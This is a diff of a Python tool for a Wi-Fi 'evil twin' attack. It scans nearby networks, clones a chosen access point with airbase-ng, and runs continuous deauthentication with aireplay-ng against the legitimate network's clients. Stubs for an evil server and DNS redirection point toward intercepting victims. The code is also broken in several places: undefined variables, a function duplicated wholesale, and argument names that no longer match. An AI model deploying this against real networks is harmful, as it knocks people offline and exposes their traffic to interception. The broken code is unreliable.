@@ -29,8 +29,8 @@ def monitor_mode(interface):
         cmd = ['sudo', 'airmon-ng', 'start', interface]
         result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
         output = result.stdout
-        mon_interface = parse_monitor_interface(output)
         print("[+] initialized network interface!")
+        mon_interface = parse_monitor_interface(output)
         return mon_interface
 
     except:
@@ -72,12 +72,11 @@ def collect_target_data(mon_interface, log_prefix):
     networks = {}
 
     log_file = log_prefix + '-01.csv'
-    print(mon_interface)
     cmd = 'sudo airodump-ng {} -w {}'.format(mon_interface, log_prefix)
     # execute for 30 seconds, then kill
 
     proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
-    time.sleep(1)
+    time.sleep(6)
     proc.kill()
     
 
@@ -157,17 +156,69 @@ def user_network_decision(network_data):
 
 
     
-def clone_network(network, interface, channel=1):
+def clone_network(network, mon_interface, channel=1):
+    '''
+    clones the user-selected network 
 
-    pass
+    params:
+        - network(tuple): (bssid,essid)
+        - mon_interface(string): name of the monitor mode interface
+        - channel(int): wireless channel to deploy network on 
+    returns:
+        - net_clone_process(process): process responsible for running rogue AP
+    '''
+    
+    print("[-] cloning {}...".format(network[1]))
+
+    print(channel)
+    print(network)
+    print(mon_interface)
+    cmd = 'sudo airbase-ng -a {} --essid {} -c {} {}'.format(network[0], network[1], channel, mon_interface)
+    net_clone_proc =  subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
+
+    print("[+] cloned {}!".format(network[1]))
+
+    return net_clone_proc
 
 
-def deauth_clients(bssid, interface):
-    pass
+def deauth_clients(bssid, mon_interface):
+    '''
+    disconnects clients from target AP that we cloned
+
+    params:
+        bssid(string): bssid of the original AP that we want to disconnect clients from
+        interface(string): interface used for deauthing clients
+    '''
+
+    try:
+        print("[-] deauthing clients...")
+
+        cmd = 'sudo aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'.format(network[0], mon_interface)
+        proc = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
+
+        print("[+] deauthed clients!")
+    except:
+        print("[!] error deauthing clients!")
+        exit()
 
 
 def bridge_internet():
-    pass
+    '''
+    provide fake access point with internet access
+    '''
+
+    try:
+        print("[-] ...")
+
+        cmd = 'sudo aireplay-ng --deauth 0 -a {} {} --ignore-negative-one'.format(network[0], mon_interface)
+        proc = subprocess.Popen("exec " + cmd, stdout=subprocess.PIPE, shell=True)
+
+        print("[+] deauthed clients!")
+    except:
+        print("[!] error deauthing clients!")
+        exit()
+
+
 
 def launch_evil_server():
     pass
@@ -179,39 +230,59 @@ def redirect_dns():
 def restore_dns():
     pass
 
+def clean(mon_interface, net_clone_proc):
+    '''
+    restore monitor to managed mode and remove access point process
 
-def managed_mode(mon_interface):
+    params:
+        - mon_interface(string): monitor mode interface
+        - net_clone_proc(subprocess): kills the network process
     '''
-    Returns the network interface to managed mode
-    '''
+    try:
+        print("[-] restoring network interface to managed mode...")
+        cmd = ['sudo', 'airmon-ng', 'stop', mon_interface]
+        result = subprocess.run(cmd, stdout=subprocess.PIPE, universal_newlines=True)
+        print("[+] restored network interface to managed mode!")
+        net_clone_proc.kill()
+    except:
+        print("Error occured during clean")
+
+
+
+
 
 def main():
     """
     Main Driver
     """
-    #try:
-    # create the log
-    #log = open("./logs/process.log", "a")
-    dump_prefix = 'dump'
-    # check for root access
-    check_root()
-    # get the network interface from the user
-    parser = argparse.ArgumentParser()
-    parser.add_argument('interface', help='network interface to use', type=str)
-    args = parser.parse_args()
-    interface = args.interface
-    # change the network card to monitor mode
-    mon_interface = monitor_mode(interface)
-    # capture wireless packets (recon)
-    network_data = collect_target_data(mon_interface, dump_prefix)
-    # present user with option of network to clone and allow for them to decide
-    target_network = user_network_decision(network_data)
-    # create the evil twin
-    clone_network(target_network, mon_interface)
-    
+    try:
+        # create the log
+        #log = open("./logs/process.log", "a")
+        dump_prefix = 'dump'
+        # check for root access
+        check_root()
+        # get the network interface from the user
+        parser = argparse.ArgumentParser()
+        parser.add_argument('rogue-ap-interface', help='network interface to use to create rogue access point', type=str)
+        parser.add_argument('upstream-interface', help='network interface to use to maintain upstream internet connectivity', type=str)
+        args = parser.parse_args()
+        interface = args.interface
+        # change the network card to monitor mode
+        mon_interface = monitor_mode(interface)
+        # capture wireless packets (recon)
+        network_data = collect_target_data(mon_interface, dump_prefix)
+        # present user with option of network to clone and allow for them to decide
+        target_network = user_network_decision(network_data)
+        # create the evil twin
+        net_clone_proc = clone_network(target_network, mon_interface)
+        # deauthorize clients of legitimate network
+        deauth_clients()
 
-    #except Exception: 
-    #    exit()
+        clean(mon_interface, net_clone_proc)
+
+    except: 
+        clean(mon_interface, net_clone_proc)
+        exit()
 
 
 
